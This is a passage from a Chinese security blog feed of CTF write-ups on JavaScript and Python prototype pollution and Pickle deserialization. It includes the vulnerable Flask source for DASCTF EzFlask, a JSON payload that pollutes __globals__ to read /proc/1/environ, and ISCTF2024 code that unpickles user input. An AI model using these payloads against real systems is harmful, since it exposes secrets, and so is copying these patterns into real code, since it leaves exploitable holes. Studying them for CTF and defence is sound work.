属性指向一个对象，它是用来存储属性和方法，这些属性和方法可以被该函数的实例对象所继承。而 <code>__proto__</code> 属性指向该对象的原型，它是用来实现对象之间的继承。简单来说就是<code>functionName.prototype===varName.__proto__</code>，都可以访问到对象的原型。</li></ul><h2 id="nodejs原型链污染"><a href="#nodejs原型链污染" class="headerlink" title="nodejs原型链污染"></a>nodejs原型链污染</h2><p><strong>概念</strong></p><p>一句话概括原型链污染：如果修改了一个对象的原型，那么会影响所有来自于这个原型的对象，这就是原型链污染。</p><p>原型链污染通常出现在对象，数组的键名或者属性名可控，同时是赋值语句的情况下 （简单来说就是键名和键值都可控情况下），将键名设置为<code>__proto__</code>就可以利用赋值语句修改原型对象，进而实现原型链污染，常见的危险函数有merge和clone。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Learn from:&lt;a href=&quot;https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html&quot;&gt;https://wiki.wgpsec.org/knowledge/ctf/js-pro</summary>
      
    
    
    
    <category term="pollute" scheme="https://gu0f3n.github.io/categories/pollute/"/>
    
    
    <category term="nodejs" scheme="https://gu0f3n.github.io/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>Python原型链污染</title>
    <link href="https://gu0f3n.github.io/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>https://gu0f3n.github.io/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2024-11-22T07:12:18.000Z</published>
    <updated>2024-11-25T04:52:55.992Z</updated>
    
    <content type="html"><![CDATA[<p>leran from :<a href="https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p><h1 id="Python原型链污染"><a href="#Python原型链污染" class="headerlink" title="Python原型链污染"></a>Python原型链污染</h1><p>这个知识点应用的范围比较小，仅当题目中出现<code>utils</code>的<code>merge</code>或<code>Pydash</code>模块中的<code>set</code>和<code>set_with</code>函数才会用上</p><p>首先经典回顾一下python的类与继承：</p><ul><li>在Python中，定义类是通过<code>class</code>关键字，<code>class</code>后面紧接着是类名，紧接着是<code>(object)</code>，表示该类是从哪个类继承下来的，所有类的本源都是object类</li><li>可以自由地给一个实例变量绑定属性，像js</li><li>由于类可以起到模板的作用，因此，可以在创建实例的时候，把一些我们认为必须绑定的属性强制填写进去。通过定义一个特殊的<code>__init__</code>方法，在创建实例的时候，就把类内置的属性绑上</li><li>注意到<code>__init__</code>方法的第一个参数永远是<code>self</code>，表示创建的实例本身，因此，在<code>__init__</code>方法内部，就可以把各种属性绑定到<code>self</code>，因为<code>self</code>就指向创建的实例本身。</li><li>当我们定义了一个类属性后，这个属性虽然归类所有，但类的所有实例都可以访问到</li><li>判断一个变量是否是某个类型可以用<code>isinstance()</code>判断。</li></ul><p>在Python中每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。</p><h2 id="DASCTF-2023-0X401七月暑期挑战赛-EzFlask"><a href="#DASCTF-2023-0X401七月暑期挑战赛-EzFlask" class="headerlink" title="[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask"></a>[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)<span class="comment">#用于创建一个 Flask 应用实例</span></span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())<span class="comment">#设置 Flask 应用的密钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment">#遍历 src，递归合并数据到 dst，支持字典合并和对象属性动态更新。</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#@app.route 是一个装饰器</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:<span class="comment">#检查请求中是否有数据</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#使用 try...except 捕获所有可能的异常，确保程序不会因为意外错误而崩溃</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):<span class="comment">#假定是一个自定义的函数，用于验证请求数据的合法性</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)<span class="comment">#将请求中的原始数据（字节流）解析为 Python 字典,如果解析失败,返回 &quot;Register Failed&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)<span class="comment">#将 data 中的键值对合并到用户实例 User 中</span></span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure><p>看到merge函数基本想到的就是python原型链污染</p><p>利用merge来动态污染原型链的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;:&quot;111&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;222&quot;,</span><br><span class="line">    &quot;__class__&quot;:&#123;</span><br><span class="line">        &quot;check&quot;:&#123;</span><br><span class="line">            &quot;__globals__&quot;:&#123;</span><br><span class="line">                &quot;__file__&quot; : &quot;/proc/1/environ&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接get &#x2F;就好</p><p>象征性的复现一下(●’◡’●)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;leran from :&lt;a href=&quot;https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&quot;&gt;https://pazuris.cn/2023/07/27/Py</summary>
      
    
    
    
    <category term="pollute" scheme="https://gu0f3n.github.io/categories/pollute/"/>
    
    
    <category term="python" scheme="https://gu0f3n.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Pickle反序列化</title>
    <link href="https://gu0f3n.github.io/2024/11/19/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://gu0f3n.github.io/2024/11/19/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-11-19T03:10:44.000Z</published>
    <updated>2024-11-19T04:53:02.333Z</updated>
    
    <content type="html"><![CDATA[<p>Learnd From: <a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></p><h3 id="什么是Pickle？"><a href="#什么是Pickle？" class="headerlink" title="什么是Pickle？"></a>什么是Pickle？</h3><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">pickle是Python中一个能够序列化和反序列化对象的模块。和其他语言类似，Python也提供了序列化和反序列化这一功能，其中一个实现模块就是pickle。在Python中，*“Pickling”* 是将 Python 对象及其所拥有的层次结构转化为一个**二进制字节流**的过程，也就是我们常说的序列化，而 *“unpickling”* 是相反的操作，会将字节流转化回一个对象层次结构。</span><br><span class="line"></span><br><span class="line">当然在Python 中并不止pickle一个模块能够进行这一操作，更原始的序列化模块如`marshal`，同样能够完成序列化的任务，不过两者的侧重点并不相同，`marshal`存在主要是为了支持 Python 的`.pyc`文件。现在开发时一般首选pickle。</span><br><span class="line"></span><br><span class="line">pickle实际上可以看作一种**独立的语言**，通过对`opcode`的编写可以进行Python代码执行、覆盖变量等操作。直接编写的`opcode`灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</span><br><span class="line"></span><br><span class="line">既然opcode能够执行Python代码，那自然就免不了安全问题。以下是Python在pickle文档中的警告。</span><br></pre></td></tr></table></figure><h3 id="常用opcode"><a href="#常用opcode" class="headerlink" title="常用opcode"></a>常用opcode</h3><p>在Python的pickle.py中，我们能够找到所有的opcode及其解释，常用的opcode如下，这里我们以V0版本为例</p><table><thead><tr><th align="left">指令</th><th align="left">描述</th><th align="left">具体写法</th><th align="left">栈上的变化</th></tr></thead><tbody><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><table><thead><tr><th align="left"></th><th align="left"></th><th align="left"></th><th align="center"></th></tr></thead><tbody><tr><td align="left">c</td><td align="left">获取一个全局对象或import一个模块</td><td align="left">c[module]\n[instance]\n</td><td align="center">获得的对象入栈</td></tr><tr><td align="left">o</td><td align="left">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td align="left">o</td><td align="center">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td></tr><tr><td align="left">i</td><td align="left">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td align="left">i[module]\n[callable]\n</td><td align="center">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td></tr><tr><td align="left">N</td><td align="left">实例化一个None</td><td align="left">N</td><td align="center">获得的对象入栈</td></tr><tr><td align="left">S</td><td align="left">实例化一个字符串对象</td><td align="left">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td align="center">获得的对象入栈</td></tr><tr><td align="left">V</td><td align="left">实例化一个UNICODE字符串对象</td><td align="left">Vxxx\n</td><td align="center">获得的对象入栈</td></tr><tr><td align="left">I</td><td align="left">实例化一个int对象</td><td align="left">Ixxx\n</td><td align="center">获得的对象入栈</td></tr><tr><td align="left">F</td><td align="left">实例化一个float对象</td><td align="left">Fx.x\n</td><td align="center">获得的对象入栈</td></tr><tr><td align="left">R</td><td align="left">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td align="left">R</td><td align="center">函数和参数出栈，函数的返回值入栈</td></tr><tr><td align="left">.</td><td align="left">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td align="left">.</td><td align="center">无</td></tr><tr><td align="left">(</td><td align="left">向栈中压入一个MARK标记</td><td align="left">(</td><td align="center">MARK标记入栈</td></tr><tr><td align="left">t</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为元组</td><td align="left">t</td><td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">)</td><td align="left">向栈中直接压入一个空元组</td><td align="left">)</td><td align="center">空元组入栈</td></tr><tr><td align="left">l</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为列表</td><td align="left">l</td><td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">]</td><td align="left">向栈中直接压入一个空列表</td><td align="left">]</td><td align="center">空列表入栈</td></tr><tr><td align="left">d</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td align="left">d</td><td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">}</td><td align="left">向栈中直接压入一个空字典</td><td align="left">}</td><td align="center">空字典入栈</td></tr><tr><td align="left">p</td><td align="left">将栈顶对象储存至memo_n</td><td align="left">pn\n</td><td align="center">无</td></tr><tr><td align="left">g</td><td align="left">将memo_n的对象压栈</td><td align="left">gn\n</td><td align="center">对象被压栈</td></tr><tr><td align="left">0</td><td align="left">丢弃栈顶对象</td><td align="left">0</td><td align="center">栈顶对象被丢弃</td></tr><tr><td align="left">b</td><td align="left">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td align="left">b</td><td align="center">栈上第一个元素出栈</td></tr><tr><td align="left">s</td><td align="left">将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td align="left">s</td><td align="center">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td></tr><tr><td align="left">u</td><td align="left">寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td align="left">u</td><td align="center">MARK标记以及被组合的数据出栈，字典被更新</td></tr><tr><td align="left">a</td><td align="left">将栈的第一个元素append到第二个元素(列表)中</td><td align="left">a</td><td align="center">栈顶元素出栈，第二个元素（列表）被更新</td></tr><tr><td align="left">e</td><td align="left">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td align="left">e</td><td align="center">MARK标记以及被组合的数据出栈，列表被更新</td></tr></tbody></table><h1 id="ISCTF2024【新闻系统】"><a href="#ISCTF2024【新闻系统】" class="headerlink" title="ISCTF2024【新闻系统】"></a>ISCTF2024【新闻系统】</h1><p>前面就是session 伪造不多说</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">源码：</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;W3l1com_isCTF&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">News</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, title, content</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.title = title</span><br><span class="line">        <span class="variable language_">self</span>.content = content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;news(name=<span class="subst">&#123;self.title&#125;</span>, words=<span class="subst">&#123;self.content&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NewsList</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.news_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_news</span>(<span class="params">self, title, content</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        news = News(title,content)</span><br><span class="line">        <span class="variable language_">self</span>.news_list.append(news)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">export_news</span>(<span class="params">self, news_title</span>) -&gt; <span class="built_in">str</span> | <span class="literal">None</span>:</span><br><span class="line">        news = <span class="variable language_">self</span>.get_news(news_title)</span><br><span class="line">        <span class="keyword">if</span> news <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="variable language_">self</span>.news_list.remove(news)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;删除成功&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_news</span>(<span class="params">self, serialized_news</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            news_data = base64.b64decode(serialized_news)</span><br><span class="line">            black_list = [<span class="string">&#x27;create_news&#x27;</span>,<span class="string">&#x27;export_news&#x27;</span>,<span class="string">&#x27;add_news&#x27;</span>,<span class="string">&#x27;get_news&#x27;</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">str</span>(news_data):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            news = pickle.loads(news_data) <span class="comment">#使用 pickle.loads 将解码后的数据反序列化成 Python 对象</span></span><br><span class="line">           </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(news,News):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable language_">self</span>.news_list:</span><br><span class="line">                    <span class="keyword">if</span> i.title == news.title:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="variable language_">self</span>.news_list.append(news)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_news</span>(<span class="params">self, news_title</span>) -&gt; News | <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> news <span class="keyword">in</span> <span class="variable language_">self</span>.news_list:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(news.title) == news_title:</span><br><span class="line">                <span class="keyword">return</span> news</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">newslist = NewsList()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;test&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;test111&#x27;</span>:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;password&#x27;</span>] = password</span><br><span class="line">            session[<span class="string">&#x27;status&#x27;</span>] = <span class="string">&#x27;user&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/news&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;login_error&#x27;</span>] = <span class="literal">True</span>               </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/news&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">news</span>():</span><br><span class="line">    news = newslist.news_list</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;news.html&quot;</span>,news = news)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    news = newslist.news_list</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;admin.html&quot;</span>,news = news)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)   </span><br><span class="line">    title = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">    content = request.form.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">    newslist.create_news(title,content)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/export&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">export_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    news_title = request.form[<span class="string">&quot;title&quot;</span>]</span><br><span class="line">    result = newslist.export_news(news_title)</span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>: result&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;news not found&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/add&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)    </span><br><span class="line">    serialized_news = request.form[<span class="string">&quot;serialized_news&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> newslist.add_news(serialized_news):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Failed to add news&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>伪造进入&#x2F;admin</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">news_data = base64.b64decode(serialized_news)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serialized_news = request.form[<span class="string">&quot;serialized_news&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> newslist.add_news(serialized_news):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里可以看到add路由可以进行反序列化</p><p>参考了 <a 